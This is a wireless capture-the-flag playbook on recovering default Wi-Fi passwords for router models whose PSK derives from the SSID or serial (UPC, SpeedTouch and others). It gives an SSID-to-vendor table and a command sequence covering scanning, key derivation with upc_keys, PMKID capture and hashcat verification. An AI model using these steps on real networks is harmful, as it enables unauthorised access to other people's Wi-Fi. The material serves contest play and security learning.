# Default-PSK flags — no radio time required

Some vendors derive the default PSK deterministically from the
BSSID, SSID suffix, or serial. If you can identify the vendor from
the beacon, the PSK is a lookup, not a crack.

## Known vendor signatures

| SSID / beacon pattern | vendor | derivation tool |
| --------------------- | ------ | ---------------- |
| `/^UPC\d{7}$/` | UPC / UBEE cable modems (EU) | `upc_keys` |
| `SpeedTouch……` (6-char suffix) | Thomson / Alcatel-Lucent | `stkeys` |
| `BTHub…-…` | BT SmartHub (UK) | vendor-known |
| `SKY…-…` | Sky Broadband (UK) | vendor-known |
| `TALKTALK-…` | TalkTalk (UK) | vendor-known |
| `Livebox-…` | Sagemcom (Orange FR) | vendor-known |
| `NETGEAR…` (older) | Netgear "Genie" default | pattern |

## The sequence

```
# 1. Passive-scan; note SSID matches a signature above.
recon_start(band="both", dwell_ms=250)
wait(15)
list_aps(ssid_regex="^UPC\\d{7}$")

# 2. Run the derivation to get candidate PSK(s).
#    (Off-Pineapple; on the laptop.)
upc_keys UPC1234567
# → prints ~8 candidate PSKs

# 3. Validate offline against a captured PMKID or handshake.
#    You still need one captured M1 or M2 to verify.
capture_pmkid(bssid=<target-bssid>, timeout_s=30)
convert_to_hashcat(mode=22000, ...)

# For each candidate PSK:
#   hashcat -m 22000 hs.22000 candidates.txt
# or hcxpsktool --pmkid-check <pmkid> <essid> <psk>
```

## The flag surface

PSK is the flag directly, or it decrypts a frame containing the
flag. In many WCTF puzzles the sleeper move is: several APs look
like WCTF targets, but the one with a `/^UPC\d{7}$/` SSID is
solvable in seconds while everyone else brute-forces rockyou.

## Cite

- attacks.json: `default-psk-upc-ubee`,
  `default-psk-thomson-speedtouch`.
- blasty upc_keys repo.
